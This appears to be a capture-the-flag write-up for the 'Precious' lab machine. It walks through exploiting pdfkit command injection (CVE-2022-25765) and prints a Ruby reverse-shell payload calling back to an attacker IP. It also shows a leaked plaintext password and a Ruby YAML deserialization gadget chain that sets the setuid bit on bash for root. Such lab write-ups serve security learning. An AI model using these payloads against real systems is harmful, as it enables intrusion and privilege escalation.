# Precious

## Setup

Target machine IP: 10.10.10.10 :

```bash
export TARGET=10.10.11.189
export ATTACKER=10.10.14.13
```

Set the attack machine :

## Reconnaissance

### Ports and services

Start by scanning open ports :

```bash
nmap -sT -Pn $TARGET -p - --open -sV -sC -A 
```

Result :

```text
Nmap scan report for 10.10.11.189
Host is up (0.014s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/29%OT=22%CT=1%CU=36763%PV=Y%DS=2%DC=T%G=Y%TM=644D78A
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST1
OS:1NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   13.24 ms 10.10.14.1
2   13.44 ms 10.10.11.189

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.41 seconds
```


| port      | service       | Information |
| ---       | ---           | ---         |
| 22        | ssh           | OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) |
| 80         | http         | nginx 1.18.0     |

The reported OS is: Linux

### Service: HTTP - port 80/tcp

```bash
firefox http://$TARGET
```

But this redirect to : [http://precious.htb/](http://precious.htb/)

Add this definition to `/etc/hosts` :

```shell
echo "$TARGET    precious.htb" >> /etc/hosts
```

Now, firefox can display the web page :

[[web.png]]

This page request an URL and print it as a PDF file.

Let's provide a test URL :

```shell
python3 -m http.server
```

This will provide an HTTP werb server at address : `http://10.10.14.13:8000/`

Let's provide a basic HTML file `test.html`:

```html
<html>
    <head>
        <title>Test page</title>
    </head>
    <body>
        <h1>Test page</h1>
        This is a test page
    </body>
</html>
```

In ther form, provide the URL to get the page : `http://10.10.14.13:8000/test.html`

The result is a PDF file : [[pdf.png]]

We can save this PDF file, and give a quick analyse :

```shell
exiftool enyqrlbvkx9yp09fe2fpqlbo21mxl9uf.pdf
```

Result:

```text
ExifTool Version Number         : 12.16
File Name                       : enyqrlbvkx9yp09fe2fpqlbo21mxl9uf.pdf
Directory                       : /root/Downloads
File Size                       : 16 KiB
File Modification Date/Time     : 2023:04:29 22:24:59+02:00
File Access Date/Time           : 2023:04:29 22:24:59+02:00
File Inode Change Date/Time     : 2023:04:29 22:24:59+02:00
File Permissions                : rw-rw----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

## Gaining access

### pdftk v0.8.6

Searching for a vulneravility in pdftk, an interesting one can be found :

```shell
searchsploit pdfkit
```

Result:

```text
tle                                               |  Path
------------------------------------------------------------- ---------------------------------
pdfkit v0.8.7.2 - Command Injection                          | ruby/local/51293.py
------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

get the exploit :

```shell
searchsploit -m 51293
```

Analysing the code, the vulnerabilitry is known as CVE-2022–25765, a remote command injection.

By providing some specific instruction, it is possible to ask pdftk to execute some instructions.

We can use the exploit to directly create an HTML payload: instead of providing an URL, it will provide the payload in the POST request (parameter `url`).

Start a listener :

```shell
nc -nvlp 4444
```

```shell
python3 ./51293.py -p url -w http://precious.htb/ -s 10.10.14.13 4444
```

Result:

```text
        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.13","4444"))'`
LOCALIP: 10.10.14.13:4444
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 4444".
WEBSITE: http://precious.htb/
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.
```

Result on the listener :

```text
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.189.
Ncat: Connection from 10.10.11.189:50958.
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```

We get a shell on the target with user `ruby`.

## Post-Exploitation

### Host Reconnaissance

Exploring the home suer of this user `ruby`, we find some interesting files :

```shell
cd
ls -la
```

Result:

```text
total 28
drwxr-xr-x 4 ruby ruby 4096 Apr 29 16:17 .
drwxr-xr-x 4 root root 4096 Oct 26  2022 ..
lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .bundle
drwxr-xr-x 4 ruby ruby 4096 Apr 29 16:21 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

`.bundle` is an interesting directory. It's a ruby tool.

```shell
cd .bundle 
ls -la
```

Result:

```text
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26  2022 .
drwxr-xr-x 4 ruby ruby 4096 Apr 29 16:17 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
```

```shell
cat config
```

Result:

```text
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

### from ruby to henry

Get a shel with `henry` user :

```shell
ssh henry@10.10.11.189
```

Result:

```text
henry@precious:~$ 
```

## Privilege Escalation : get a shell

### Host Reconnaissance

By exploring henry user rights, it appears that he can execute some commands using sudo :

```shell
sudo -l
```

Result:

```text
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

This ruby script :

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

This line is vulnerable :

```ruby
    YAML.load(File.read("dependencies.yml"))
```

The builtin Ruby YAML parser, it is vulnerable to deserialization attacks if YAML.load() or YAML.load_file() is used.

The file `dependencies.yml` can be in any directory.

A possible exploit is given [here](https://snyk.io/blog/finding-yaml-injection-with-snyk-code/) :


```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

The above YAML payload will execute the `id` command upon deserialization if it is parsed via `YAML.load()` or `YAML.load_file()`.

Provide this payload in file `dependencies.yml`, and test it :

```shell
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

Result:

```text
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

The command is executed :

```text
uid=0(root) gid=0(root) groups=0(root)
```

We can use it to get a root shell by adding a setuid bit to bash executable :

```text
             git_set: "chmod +s /bin/bash"
```

Execute again the exploit and get a root shell : 

```shell
sudo /usr/bin/ruby /opt/update_dependencies.rb
/bin/bash -p
```

We have a root shell.

## Loots

### credentials

| Username  					| Password  		| Hash      		| Usage     |
| ---       					| ---       		| ---       		| ---       |
| henry                         | Q3c1AqGHtoI0aXAYFH |                  |           |
